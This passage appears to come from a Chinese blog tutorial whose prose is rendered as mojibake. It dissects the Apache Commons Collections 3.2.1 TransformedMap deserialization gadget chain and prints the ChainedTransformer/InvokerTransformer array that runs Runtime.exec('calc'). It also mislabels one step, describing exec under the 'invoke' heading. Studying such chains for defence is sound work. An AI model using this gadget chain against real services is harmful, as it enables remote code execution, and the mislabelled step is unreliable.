</code></pre><h3 id=431-supertransformedmapthismapentryset>4.3.1 super(TransformedMap.this.map.entrySet());<a hidden class=anchor aria-hidden=true href=#431-supertransformedmapthismapentryset>#</a></h3><h4 id=-1-æ‹†è§£è¡¨è¾¾å¼transformedmapthismapentryset>ğŸ” 1. æ‹†è§£è¡¨è¾¾å¼ï¼š<code>TransformedMap.this.map.entrySet()</code><a hidden class=anchor aria-hidden=true href=#-1-æ‹†è§£è¡¨è¾¾å¼transformedmapthismapentryset>#</a></h4><p>âœ… TransformedMap.this.map</p><ul><li><strong>TransformedMap.this</strong>: è¿™æ˜¯Javaå†…éƒ¨ç±»è®¿é—®å…¶å¤–éƒ¨ç±»å®ä¾‹çš„æ ‡å‡†è¯­æ³•ã€‚åœ¨è¿™é‡Œï¼Œå®ƒæŒ‡çš„å°±æ˜¯æˆ‘ä»¬åˆ›å»ºçš„transformedMapå¯¹è±¡æœ¬èº«ã€‚</li><li><strong>.map</strong>: transformedMapå¯¹è±¡å†…éƒ¨æœ‰ä¸€ä¸ªä»çˆ¶ç±»ç»§æ‰¿æ¥çš„å­—æ®µmapï¼Œå®ƒå‚¨å­˜ç€æˆ‘ä»¬ä¸€å¼€å§‹ä¼ å…¥çš„é‚£ä¸ª<strong>åŸå§‹çš„HashMapå®ä¾‹</strong>ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸ºinnerMapï¼‰ã€‚</li><li><strong>.entrySet()</strong>: å› æ­¤ï¼ŒTransformedMap.this.map.entrySet()å®é™…ä¸Šç­‰ä»·äºè°ƒç”¨innerMap.entrySet()ã€‚å®ƒè·å–åˆ°çš„æ˜¯<strong>æœªç»ä»»ä½•ä¿®é¥°çš„ã€HashMapåŸç”Ÿçš„é”®å€¼å¯¹é›†åˆï¼ˆSet&lt;Map.Entry>ï¼‰</strong>ã€‚</li><li><strong>super(&mldr;)</strong>: EntrySetViewç»§æ‰¿è‡ªAbstractSetDecoratorã€‚super()è°ƒç”¨äº†<strong>çˆ¶ç±»çš„æ„é€ å‡½æ•°</strong>ï¼ŒæŠŠé‚£ä¸ª<strong>åŸç”Ÿçš„entrySet</strong>äº¤ç»™äº†çˆ¶ç±»ä¿ç®¡.</li></ul><p>ğŸ“„å®é™…ä¸Šï¼Œåœ¨ <code>TransformedMap</code> ç»§æ‰¿çš„çˆ¶ç±» <code>AbstractInputCheckedMapDecorator</code> ä¸­ï¼Œæœ‰ä¸€ä¸ªå­—æ®µï¼š</p><pre tabindex=0><code>protected final Map map; // å­˜çš„å°±æ˜¯ä½ ä¼ è¿›æ¥çš„ innerMap
</code></pre><p>ğŸ‘‰ æ‰€ä»¥ <code>TransformedMap.this.map</code> å°±æ˜¯è¿™ä¸ªåŸå§‹çš„ <code>Map</code>ï¼ˆä¾‹å¦‚ <code>new HashMap()</code>ï¼‰</p><hr><p>âœ… `.entrySet()</p><ul><li>è°ƒç”¨åŸå§‹ Map çš„ <code>entrySet()</code> æ–¹æ³•</li><li>è¿”å›ä¸€ä¸ª <code>Set&lt;Map.Entry&lt;K, V>></code>ï¼Œå³æ‰€æœ‰é”®å€¼å¯¹çš„é›†åˆ</li><li>ä¾‹å¦‚ï¼Œå¦‚æœä½  put äº† <code>"key" -> "value"</code>ï¼Œé‚£ä¹ˆ entrySet å°±åŒ…å«ä¸€ä¸ª entryï¼š<code>key="key", value="value"</code></li></ul><p>æ‰€ä»¥ï¼š</p><pre tabindex=0><code>TransformedMap.this.map.entrySet()
</code></pre><p>ğŸ‘‰ <strong>è¿”å›çš„æ˜¯åº•å±‚åŸå§‹ Map çš„æ‰€æœ‰é”®å€¼å¯¹é›†åˆï¼ˆæœªè¢«è£…é¥°çš„åŸå§‹ entrySetï¼‰</strong></p><hr><h4 id=-2-superè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°>ğŸ—ï¸ 2. <code>super(...)</code>ï¼šè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°<a hidden class=anchor aria-hidden=true href=#-2-superè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°>#</a></h4><p><code>EntrySetView</code> ç»§æ‰¿è‡ª <code>AbstractSetDecorator</code>ï¼Œè€Œ <code>AbstractSetDecorator</code> çš„æ„é€ å‡½æ•°æ˜¯ï¼š</p><pre tabindex=0><code>public abstract class AbstractSetDecorator extends AbstractCollectionDecorator implements Set {
    public AbstractSetDecorator(Set set) {
        super(set);
    }
}
</code></pre><p><code>AbstractCollectionDecorator</code> çš„æ„é€ å‡½æ•°æ˜¯ï¼š</p><pre tabindex=0><code>public AbstractCollectionDecorator(Collection collection) {
    this.collection = collection; // æŠŠä¼ å…¥çš„ collection ä¿å­˜èµ·æ¥
}
</code></pre><p>æ‰€ä»¥ï¼š</p><pre tabindex=0><code>super(TransformedMap.this.map.entrySet());
</code></pre><p>ç­‰ä»·äºï¼š</p><pre tabindex=0><code>// æŠŠåŸå§‹ map çš„ entrySet ä¿å­˜åˆ°çˆ¶ç±»çš„ collection å­—æ®µä¸­
this.collection = TransformedMap.this.map.entrySet();
</code></pre><hr><h4 id=-3-æœ€ç»ˆæ•ˆæœè£…é¥°å™¨æ¨¡å¼çš„æ ¸å¿ƒ>ğŸ¯ 3. æœ€ç»ˆæ•ˆæœï¼šè£…é¥°å™¨æ¨¡å¼çš„æ ¸å¿ƒ<a hidden class=anchor aria-hidden=true href=#-3-æœ€ç»ˆæ•ˆæœè£…é¥°å™¨æ¨¡å¼çš„æ ¸å¿ƒ>#</a></h4><p>é€šè¿‡è¿™è¡Œä»£ç ï¼Œ<code>EntrySetView</code> å®ç°äº†ï¼š</p><p><strong>â€œæˆ‘çœ‹èµ·æ¥æ˜¯ä¸€ä¸ª Setï¼Œä½†å…¶å®æˆ‘åªæ˜¯åŒ…è£…äº†åŸå§‹ Map çš„ entrySetï¼Œå¹¶å¯ä»¥åœ¨æ“ä½œæ—¶æ’å…¥é¢å¤–é€»è¾‘ã€‚â€</strong></p><p>ä¾‹å¦‚ï¼š</p><ul><li><p>å½“ä½ è°ƒç”¨ <code>entrySet().iterator()</code> æ—¶ï¼Œ</p></li><li><p><code>EntrySetView</code> å¯ä»¥è¿”å›ä¸€ä¸ª<strong>è‡ªå®šä¹‰çš„ Iterator</strong>ï¼Œ</p></li><li><p>è¿™ä¸ª Iterator è¿”å›çš„æ¯ä¸ª <code>Map.Entry</code> éƒ½æ˜¯ <code>TransformedMapEntry</code>ï¼ˆè€Œä¸æ˜¯åŸå§‹çš„ <code>HashMap$Node</code>ï¼‰ï¼Œ</p></li><li><p>è€Œ <code>TransformedMapEntry.setValue()</code> è¢«é‡å†™ï¼Œä¼šè§¦å‘ <code>checkSetValue()</code> â†’ è§¦å‘ <code>transform</code>ï¼</p><p>ğŸ‘‰ Ai æœ‰æ—¶å€™å°±æ˜¯å¤ªå•°å—¦ï¼Œè¯´äººè¯å°±æ˜¯é‡å†™äº†çˆ¶ç±»çš„è¿­ä»£å™¨iterator() æ–¹æ³•ï¼Œè‡³äºæ€ä¹ˆé‡å†™å°±çœ‹ä¸‹é¢ã€‚</p></li></ul><h4 id=-4æ€»ç»“superåšäº†ä»€ä¹ˆ>ğŸ“Œ 4.æ€»ç»“ï¼šsuper(&mldr;.);åšäº†ä»€ä¹ˆ<a hidden class=anchor aria-hidden=true href=#-4æ€»ç»“superåšäº†ä»€ä¹ˆ>#</a></h4><table><thead><tr><th>æ­¥éª¤</th><th>åŠ¨ä½œ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>1</td><td>è·å–åŸå§‹ Map</td><td><code>TransformedMap.this.map</code> æ˜¯ä½ æœ€åˆä¼ ç»™ <code>TransformedMap.decorate(...)</code> çš„é‚£ä¸ª <code>HashMap</code></td></tr><tr><td>2</td><td>è·å–å…¶ entrySet</td><td><code>entrySet()</code> è¿”å›åŸå§‹é”®å€¼å¯¹é›†åˆ</td></tr><tr><td>3</td><td>ä¼ ç»™çˆ¶ç±»æ„é€ å‡½æ•°</td><td><code>super(...)</code> æŠŠè¿™ä¸ª entrySet ä¿å­˜åˆ°çˆ¶ç±»çš„ <code>collection</code> å­—æ®µä¸­</td></tr><tr><td>4</td><td>å®ç°è£…é¥°å™¨è¡Œä¸º</td><td>åç»­å¯¹ <code>entrySet()</code> çš„æ“ä½œï¼ˆå¦‚éå†ã€setValueï¼‰å¯ä»¥è¢«æ‹¦æˆªå’Œå¢å¼º</td></tr></tbody></table><p>âœ… <strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼š
è¿™è¡Œä»£ç æŠŠåŸå§‹ Map çš„ entrySet â€œå§”æ‰˜â€ç»™çˆ¶ç±»ä¿å­˜ï¼Œä½¿å¾— <code>EntrySetView</code> èƒ½åœ¨ä¸æ”¹å˜åŸå§‹æ•°æ®ç»“æ„çš„å‰æä¸‹ï¼Œ<strong>åŠ¨æ€å¢å¼º entry çš„è¡Œä¸º</strong>ï¼ˆæ¯”å¦‚è®© <code>setValue</code> è§¦å‘ transformï¼‰ï¼Œè¿™æ˜¯è£…é¥°å™¨æ¨¡å¼çš„å…¸å‹åº”ç”¨ï¼Œä¹Ÿæ˜¯ååºåˆ—åŒ–æ¼æ´èƒ½è§¦å‘çš„å…³é”®ä¸€ç¯ã€‚</p><h2 id=44-transformedmapentryiteratoré‡å†™çˆ¶ç±»è¿­ä»£å™¨>4.4 TransformedMapEntryIterator(é‡å†™çˆ¶ç±»è¿­ä»£å™¨)<a hidden class=anchor aria-hidden=true href=#44-transformedmapentryiteratoré‡å†™çˆ¶ç±»è¿­ä»£å™¨>#</a></h2><h3 id=441-iterator-æ˜¯ä»€ä¹ˆ>4.4.1 ğŸ”<code>iterator()</code> æ˜¯ä»€ä¹ˆï¼Ÿ<a hidden class=anchor aria-hidden=true href=#441-iterator-æ˜¯ä»€ä¹ˆ>#</a></h3><p>âœ… å®ƒæ˜¯ Java é›†åˆæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ ‡å‡†æ–¹æ³•</p><p>æ‰€æœ‰å®ç°äº† <code>Iterable&lt;T></code> æ¥å£çš„ç±»ï¼ˆå¦‚ <code>List</code>, <code>Set</code>, <code>Map.EntrySet</code> ç­‰ï¼‰éƒ½å¿…é¡»æä¾›ä¸€ä¸ªï¼š</p><pre tabindex=0><code>Iterator&lt;T&gt; iterator();
</code></pre><ul><li>è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ï¼š<strong>è¿”å›ä¸€ä¸ªå¯ä»¥éå†è¯¥é›†åˆä¸­æ‰€æœ‰å…ƒç´ çš„å¯¹è±¡ï¼ˆå³ Iteratorï¼‰</strong></li></ul><p>ä¾‹å¦‚ï¼š</p><pre tabindex=0><code>Set&lt;String&gt; set = new HashSet&lt;&gt;();
set.add(&#34;A&#34;);
set.add(&#34;B&#34;);

Iterator&lt;String&gt; it = set.iterator(); // â† è°ƒç”¨ iterator()
while (it.hasNext()) {
    System.out.println(it.next()); // è¾“å‡º A, B
}
</code></pre><p>ğŸ’¡ <code>for-each</code> å¾ªç¯ï¼ˆå¦‚ <code>for (Entry e : map.entrySet())</code>ï¼‰åº•å±‚å°±æ˜¯è°ƒç”¨ <code>iterator()</code>ï¼</p><hr><h3 id=442-new-transformedmapentryiteratoè¿”å›transformedmapentry>4.4.2 new TransformedMapEntryIterato(è¿”å›TransformedMapEntry)<a hidden class=anchor aria-hidden=true href=#442-new-transformedmapentryiteratoè¿”å›transformedmapentry>#</a></h3><p>ğŸ”§ åœ¨ <code>TransformedMap</code> ä¸­ï¼Œ<code>entrySet()</code> è¿”å›çš„æ˜¯ <code>EntrySetView</code>ï¼ˆç»§æ‰¿è‡ª <code>AbstractSetDecorator</code>ï¼‰ã€‚</p><p>è€Œ <code>AbstractSetDecorator</code> çš„ <code>iterator()</code> æ–¹æ³•é»˜è®¤æ˜¯è¿™æ ·çš„ï¼š</p><pre tabindex=0><code>// AbstractSetDecorator.java
public Iterator iterator() {
    return collection.iterator(); // é»˜è®¤ç›´æ¥è¿”å›åº•å±‚é›†åˆçš„ iterator
}
</code></pre><p>ä½†ï¼<code>TransformedMap</code> çš„ <code>EntrySetView</code> <strong>é‡å†™äº† <code>iterator()</code> æ–¹æ³•</strong>ï¼ˆåœ¨æŸäº›ç‰ˆæœ¬ä¸­æ˜¯é€šè¿‡çˆ¶ç±»é—´æ¥å®ç°ï¼Œä½†æ•ˆæœä¸€æ ·ï¼‰ï¼š</p><p>âœ… å®é™…é€»è¾‘ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p><pre tabindex=0><code>protected class EntrySetView extends AbstractSetDecorator {
    protected EntrySetView() {
        super(TransformedMap.this.map.entrySet());
    }

    @Override
    public Iterator iterator() {
        // è¿”å›ä¸€ä¸ªâ€œåŒ…è£…è¿‡çš„â€ iterator
        return new TransformedMapEntryIterator(super.iterator());
    }
}
</code></pre><p>ç„¶åï¼š</p><pre tabindex=0><code>protected class TransformedMapEntryIterator implements Iterator {
    private final Iterator iterator;

    public TransformedMapEntryIterator(Iterator iterator) {
        this.iterator = iterator; // åŸå§‹ entry çš„ iterator
    }

    @Override
    public Object next() {
        Map.Entry entry = (Map.Entry) iterator.next();
        // æŠŠåŸå§‹ entry åŒ…è£…æˆ TransformedMapEntryï¼
        return new TransformedMapEntry(entry, TransformedMap.this);
    }

    @Override
    public boolean hasNext() {
        return iterator.hasNext();
    }
}
</code></pre><hr><h3 id=-å…³é”®ç‚¹ä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦>ğŸ¯ å…³é”®ç‚¹ï¼šä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#-å…³é”®ç‚¹ä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦>#</a></h3><p>å› ä¸ºï¼š</p><ul><li><p>åŸå§‹ <code>HashMap</code> çš„ <code>entrySet().iterator().next()</code> è¿”å›çš„æ˜¯ <code>HashMap$Node</code>ï¼ˆæ™®é€š Entryï¼‰</p></li><li><p>ä½† <code>TransformedMap</code> çš„ <code>entrySet().iterator().next()</code> è¿”å›çš„æ˜¯ <strong><code>TransformedMapEntry</code></strong></p></li><li><p>è€Œ <code>TransformedMapEntry</code> <strong>é‡å†™äº† <code>setValue()</code> æ–¹æ³•</strong></p><pre tabindex=0><code>public Object setValue(Object value) {
    parent.checkSetValue(value); // â† è§¦å‘ transformï¼
    return entry.setValue(value);
}
</code></pre></li></ul><p>æ‰€ä»¥å½“ä½ å†™ï¼š</p><pre tabindex=0><code>for (Map.Entry e : transformedMap.entrySet()) {
    e.setValue(&#34;new value&#34;); // å®é™…è°ƒç”¨çš„æ˜¯ TransformedMapEntry.setValue()
}
</code></pre><p>â†’ å°±ä¼šè§¦å‘ <code>checkSetValue()</code> â†’ è§¦å‘ <code>valueTransformer.transform()</code> â†’ æ‰§è¡Œæ¶æ„ä»£ç ï¼</p><p>ğŸ¯ æ€»ç»“ï¼šæ•´ä¸ªé“¾æ¡æ˜¯å¦‚ä½•ä¸²èµ·æ¥çš„ï¼Ÿ</p><table><thead><tr><th>æ­¥éª¤</th><th>ä»£ç </th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>1</td><td><code>transformedMap.entrySet()</code></td><td>è¿”å› <code>EntrySetView</code></td></tr><tr><td>2</td><td><code>.iterator()</code></td><td>è¿”å› <code>TransformedMapEntryIterator</code></td></tr><tr><td>3</td><td><code>.next()</code></td><td>è¿”å› <code>TransformedMapEntry</code>ï¼ˆåŒ…è£…è¿‡çš„ entryï¼‰</td></tr><tr><td>4</td><td><code>e.setValue(...)</code></td><td>è°ƒç”¨ <code>TransformedMapEntry.setValue(...)</code></td></tr><tr><td>5</td><td><code>parent.checkSetValue(...)</code></td><td>è°ƒç”¨ <code>TransformedMap.checkSetValue(...)</code></td></tr><tr><td>6</td><td><code>valueTransformer.transform(...)</code></td><td>æ‰§è¡Œ <code>ChainedTransformer</code> æ”»å‡»é“¾</td></tr><tr><td>7</td><td>æœ€ç»ˆ</td><td><code>Runtime.exec("calc")</code> ğŸ’¥</td></tr></tbody></table><h2 id=45-esetvalue>4.5 e.setValue()<a hidden class=anchor aria-hidden=true href=#45-esetvalue>#</a></h2><h3 id=parentæ˜¯transformedmap>âœ…parentæ˜¯TransformedMap<a hidden class=anchor aria-hidden=true href=#parentæ˜¯transformedmap>#</a></h3><h3 id=eæ˜¯transformedmapentry---mapentry>âœ…eæ˜¯TransformedMapEntry â†”ï¸ MapEntry<a hidden class=anchor aria-hidden=true href=#eæ˜¯transformedmapentry---mapentry>#</a></h3><pre tabindex=0><code>// AbstractInputCheckedMapDecorator.MapEntry.setValue()
public Object setValue(Object value) {
    parent.checkSetValue(value); // parent æ˜¯ TransformedMap
    return entry.setValue(value);
}

// TransformedMap.checkSetValue()
protected Object checkSetValue(Object value) {
    if (valueTransformer != null) {
        return valueTransformer.transform(value); // è§¦å‘ chainedTransformer
    }
    return value;
}
</code></pre><p>çŸ¥é“äº†ä¸ºä»€ä¹ˆè¿”å› TransformedMapEntry â†”ï¸ MapEntry ï¼ŒMapEntry æ˜¯ TransformedMapEntry çš„çˆ¶ç±»ï¼Œå°±æ˜¯åˆ°parentå½¢å‚æ˜¯ä»€ä¹ˆäº†ã€‚</p><p>ğŸ‘‡ä¸‹é¢æ˜¯ä¸Šé¢è¿™æ®µä»£ç çš„æ‰§è¡Œé€»è¾‘</p><ul><li><code>MapEntry.setValue(...)</code> ç­‰åŒäº<code>TransformedMapEntry.setValue(...)</code></li><li>æ ¹æ®<code>return new TransformedMapEntry(entry, TransformedMap.this);</code> æˆ‘ä»¬å¾—å‡º<code>parent = TransformedMap.this</code> ä¹Ÿå°±æ˜¯ transformedMapå®ä¾‹</li><li>æ‰§è¡Œ<code>setValue()</code>æ–¹æ³•ï¼Œè¿™é‡Œé¢çš„é€»è¾‘æ˜¯<code>parent.checkSetValue(value);</code> ä¹Ÿå°±æ˜¯<code>transformedMap.checkSetValue(value);</code></li><li><code>checkSetValue(Object value)</code>é‡Œé¢çš„é€»è¾‘æ˜¯<code>valueTransformer.transform(value);</code></li><li>valueTransformeræ˜¯chainedTransformerä¹Ÿå°±æ˜¯<code>chainedTransformer.transform(value);</code></li></ul><h2 id=46-transformedmapchecksetvaluevalue>4.6 transformedMap.checkSetValue(value)<a hidden class=anchor aria-hidden=true href=#46-transformedmapchecksetvaluevalue>#</a></h2><p>è½¬è€Œæ‰§è¡ŒcheckSetValue(Object value)é‡Œé¢çš„é€»è¾‘valueTransformer.transform(value);</p><h2 id=47-chainedtransformertransform>4.7 ChainedTransformer.transform()<a hidden class=anchor aria-hidden=true href=#47-chainedtransformertransform>#</a></h2><p>valueTransformeræ˜¯chainedTransformerä¹Ÿå°±æ˜¯æ‰§è¡Œ<code>chainedTransformer.transform(value);</code></p><p>æˆ‘ä»¬å°†æ·±å…¥ <strong>Apache Commons Collections â‰¤ 3.2.1</strong> ä¸­çš„ <code>ChainedTransformer.transform()</code> æ–¹æ³•ï¼Œ<strong>é€è¡Œè§£æå…¶æºç ã€æ‰§è¡Œé€»è¾‘å’Œæ”»å‡»é“¾æ‹¼æ¥åŸç†</strong>ï¼Œå¹¶è¯´æ˜å®ƒå¦‚ä½•ä¸€æ­¥æ­¥æœ€ç»ˆæ‰§è¡Œ <code>Runtime.getRuntime().exec("calc")</code>ã€‚</p><h3 id=-èƒŒæ™¯ä»€ä¹ˆæ˜¯-chainedtransformer>ğŸ“¦ èƒŒæ™¯ï¼šä»€ä¹ˆæ˜¯ <code>ChainedTransformer</code>ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#-èƒŒæ™¯ä»€ä¹ˆæ˜¯-chainedtransformer>#</a></h3><p><code>ChainedTransformer</code> æ˜¯ Commons Collections æä¾›çš„ä¸€ä¸ª <strong>ç»„åˆå‹ Transformer</strong>ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ª <code>Transformer</code> æŒ‰é¡ºåºä¸²è”èµ·æ¥ï¼Œå‰ä¸€ä¸ªçš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªçš„è¾“å…¥ã€‚</p><p>åœ¨æ¼æ´åˆ©ç”¨ä¸­ï¼Œæ”»å‡»è€…å°†å…¶æ„é€ ä¸ºï¼š</p><pre tabindex=0><code>Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, new Class[0]}),
    new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc&#34;})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
</code></pre><p>å½“è°ƒç”¨ <code>chainedTransformer.transform(null)</code> æ—¶ï¼Œå°±ä¼šæ‰§è¡Œå‘½ä»¤ã€‚</p><h3 id=-chainedtransformertransform-æºç commons-collections-321>ğŸ” <code>ChainedTransformer.transform()</code> æºç ï¼ˆCommons Collections 3.2.1ï¼‰<a hidden class=anchor aria-hidden=true href=#-chainedtransformertransform-æºç commons-collections-321>#</a></h3><pre tabindex=0><code>// org.apache.commons.collections.functors.ChainedTransformer

public Object transform(Object object) {
    for (int i = 0; i &lt; iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
</code></pre><p>å…¶ä¸­ï¼š</p><ul><li><p><code>iTransformers</code> æ˜¯æ„é€ æ—¶ä¼ å…¥çš„ <code>Transformer[]</code> æ•°ç»„ï¼›</p></li><li><p>åˆå§‹ <code>object</code> æ˜¯è°ƒç”¨è€…ä¼ å…¥çš„å‚æ•°ï¼ˆæ”»å‡»ä¸­é€šå¸¸ä¸º <code>null</code>ï¼‰ï¼›</p></li><li><p>æ¯ä¸€æ­¥çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€æ­¥çš„è¾“å…¥ã€‚</p></li></ul><hr><h3 id=-æ”»å‡»é“¾å®Œæ•´ä»£ç å›é¡¾>ğŸ§© æ”»å‡»é“¾å®Œæ•´ä»£ç å›é¡¾<a hidden class=anchor aria-hidden=true href=#-æ”»å‡»é“¾å®Œæ•´ä»£ç å›é¡¾>#</a></h3><pre tabindex=0><code>Transformer[] transformers = new Transformer[] {
    // Step 1: è¿”å› Runtime.class
    new ConstantTransformer(Runtime.class),

    // Step 2: è°ƒç”¨ Runtime.class.getMethod(&#34;getRuntime&#34;, new Class[0])
    new InvokerTransformer(&#34;getMethod&#34;,
        new Class[]{String.class, Class[].class},
        new Object[]{&#34;getRuntime&#34;, new Class[0]}),

    // Step 3: è°ƒç”¨ Method.invoke(null, new Object[0]) â†’ å¾—åˆ° Runtime å®ä¾‹
    new InvokerTransformer(&#34;invoke&#34;,
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),

    // Step 4: è°ƒç”¨ runtime.exec(&#34;calc&#34;)
    new InvokerTransformer(&#34;exec&#34;,
        new Class[]{String.class},
        new Object[]{&#34;calc&#34;})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null); // â† è§¦å‘æ•´ä¸ªé“¾
</code></pre><h3 id=-é€è¡Œæ‰§è¡Œé€»è¾‘åˆ†æ>ğŸš¶â€â™‚ï¸ é€è¡Œæ‰§è¡Œé€»è¾‘åˆ†æ<a hidden class=anchor aria-hidden=true href=#-é€è¡Œæ‰§è¡Œé€»è¾‘åˆ†æ>#</a></h3><p>æˆ‘ä»¬æ¨¡æ‹Ÿ <code>chain.transform(null)</code> çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><h4 id=-åˆå§‹çŠ¶æ€>ğŸ”¹ åˆå§‹çŠ¶æ€<a hidden class=anchor aria-hidden=true href=#-åˆå§‹çŠ¶æ€>#</a></h4><pre tabindex=0><code>Object object = null;
Transformer[] iTransformers = [ConstantTransformer, InvokerTransformerÃ—3];
</code></pre><h4 id=-step-1-constanttransformertransformnull>âœ… Step 1: <code>ConstantTransformer.transform(null)</code><a hidden class=anchor aria-hidden=true href=#-step-1-constanttransformertransformnull>#</a></h4><p><strong>æºç </strong>ï¼ˆ<code>ConstantTransformer.java</code>ï¼‰ï¼š</p><pre tabindex=0><code>public Object transform(Object input) {
    return iConstant; // ç›´æ¥è¿”å›æ„é€ æ—¶ä¼ å…¥çš„å¸¸é‡
}
</code></pre><ul><li>è¾“å…¥ï¼š<code>object = null</code></li><li>æ‰§è¡Œï¼š<code>return Runtime.class</code></li><li>è¾“å‡ºï¼š<code>object = java.lang.Runtime.class</code></li></ul><blockquote><p>ğŸ’¡ <code>ConstantTransformer</code> å¿½ç•¥è¾“å…¥ï¼Œç›´æ¥è¿”å›å›ºå®šå€¼ã€‚</p></blockquote><hr><h4 id=-step-2-invokertransformergetmethod-transformruntimeclass>âœ… Step 2: <code>InvokerTransformer("getMethod", ...).transform(Runtime.class)</code><a hidden class=anchor aria-hidden=true href=#-step-2-invokertransformergetmethod-transformruntimeclass>#</a></h4><pre tabindex=0><code>public Object transform(Object input) {
    if (input == null) return null;
    try {
        Class&lt;?&gt; cls = input.getClass();                     // â† input = Runtime.class â†’ cls = Class.class
        Method method = cls.getMethod(iMethodName, iParamTypes); // getMethod(&#34;getMethod&#34;, String.class, Class[].class)
        return method.invoke(input, iArgs);                  // invoke(Runtime.class, &#34;getRuntime&#34;, new Class[0])
    } catch (Exception e) {
        throw new FunctorException(...);
    }
}
</code></pre><ul><li>è¾“å…¥ï¼š<code>object = Runtime.class</code></li><li><code>input.getClass()</code> â†’ <code>Class.class</code>ï¼ˆå› ä¸º <code>Runtime.class</code> æ˜¯ <code>Class</code> çš„å®ä¾‹ï¼‰</li><li><code>getMethod("getMethod", String.class, Class[].class)</code> â†’ è·å– <code>Class.getMethod</code> æ–¹æ³•</li><li><code>method.invoke(Runtime.class, "getRuntime", new Class[0])</code><ul><li>ç­‰ä»·äºï¼š<code>Runtime.class.getMethod("getRuntime", new Class[0])</code></li><li>è¿”å›ï¼š<code>java.lang.reflect.Method</code> å¯¹è±¡ï¼ˆä»£è¡¨ <code>Runtime.getRuntime()</code>ï¼‰</li></ul></li><li>è¾“å‡ºï¼š<code>object = Method&lt;Runtime.getRuntime()></code></li></ul><blockquote><p>âš ï¸ æ³¨æ„ï¼šè¿™é‡Œè°ƒç”¨çš„æ˜¯ <code>Class.getMethod</code>ï¼Œä¸æ˜¯ <code>Runtime.getRuntime</code>ï¼</p></blockquote><hr><h4 id=-step-3-invokertransformerinvoke-transformmethod>âœ… Step 3: <code>InvokerTransformer("invoke", ...).transform(method)</code><a hidden class=anchor aria-hidden=true href=#-step-3-invokertransformerinvoke-transformmethod>#</a></h4><ul><li>è¾“å…¥ï¼š<code>object = Runtime å®ä¾‹</code></li><li><code>input.getClass()</code> â†’ <code>java.lang.Runtime</code></li><li><code>getMethod("exec", String.class)</code> â†’ è·å– <code>Runtime.exec(String)</code> æ–¹æ³•</li><li><code>method.invoke(runtime, "calc")</code><ul><li>ç­‰ä»·äºï¼š<code>runtime.exec("calc")</code></li><li>è¿”å›ï¼š<code>Process</code> å¯¹è±¡ï¼ˆä½†æ”»å‡»è€…ä¸å…³å¿ƒè¿”å›å€¼ï¼‰</li></ul></li><li>è¾“å‡ºï¼š<code>object = Process@xxxxxx</code></li></ul><blockquote><p>ğŸ’¥ æ­¤æ—¶ï¼Œ<code>calc.exe</code> å·²è¢«å¯åŠ¨ï¼</p></blockquote><hr><h3 id=-æ‰§è¡Œæµç¨‹æ€»ç»“>ğŸ”„ æ‰§è¡Œæµç¨‹æ€»ç»“<a hidden class=anchor aria-hidden=true href=#-æ‰§è¡Œæµç¨‹æ€»ç»“>#</a></h3><table><thead><tr><th>æ­¥éª¤</th><th>Transformer ç±»å‹</th><th>è¾“å…¥</th><th>æ‰§è¡ŒåŠ¨ä½œ</th><th>è¾“å‡º</th></tr></thead><tbody><tr><td>1</td><td><code>ConstantTransformer</code></td><td><code>null</code></td><td>è¿”å› <code>Runtime.class</code></td><td><code>Class&lt;Runtime></code></td></tr><tr><td>2</td><td><code>InvokerTransformer("getMethod")</code></td><td><code>Class&lt;Runtime></code></td><td><code>Runtime.class.getMethod("getRuntime", ...)</code></td><td><code>Method&lt;getRuntime></code></td></tr><tr><td>3</td><td><code>InvokerTransformer("invoke")</code></td><td><code>Method&lt;getRuntime></code></td><td><code>method.invoke(null, ...)</code> â†’ <code>Runtime.getRuntime()</code></td><td><code>Runtime</code> å®ä¾‹</td></tr><tr><td>4</td><td><code>InvokerTransformer("exec")</code></td><td><code>Runtime</code> å®ä¾‹</td><td><code>runtime.exec("calc")</code></td><td><code>Process</code>ï¼ˆå‘½ä»¤å·²æ‰§è¡Œï¼‰</td></tr></tbody></table><h3 id=-å…³é”®ç‚¹æ€»ç»“>ğŸ”‘ å…³é”®ç‚¹æ€»ç»“<a hidden class=anchor aria-hidden=true href=#-å…³é”®ç‚¹æ€»ç»“>#</a></h3><ol><li><strong><code>ChainedTransformer</code> æœ¬èº«æ— å®³</strong>ï¼Œåªæ˜¯æŒ‰é¡ºåºè°ƒç”¨ <code>transform()</code>ï¼›</li><li><strong>çœŸæ­£çš„å±é™©æ¥è‡ª <code>InvokerTransformer</code></strong>ï¼šå®ƒèƒ½ä»»æ„è°ƒç”¨æ–¹æ³•ï¼ˆåå°„ï¼‰ï¼›</li><li><strong><code>ConstantTransformer</code> ç”¨äºâ€œæ³¨å…¥â€èµ·å§‹ç±»</strong>ï¼ˆå¦‚ <code>Runtime.class</code>ï¼‰ï¼›</li><li>æ•´ä¸ªé“¾ä¾èµ– <strong>Java åå°„æœºåˆ¶</strong>ï¼Œé€šè¿‡ <code>getMethod</code> + <code>invoke</code> 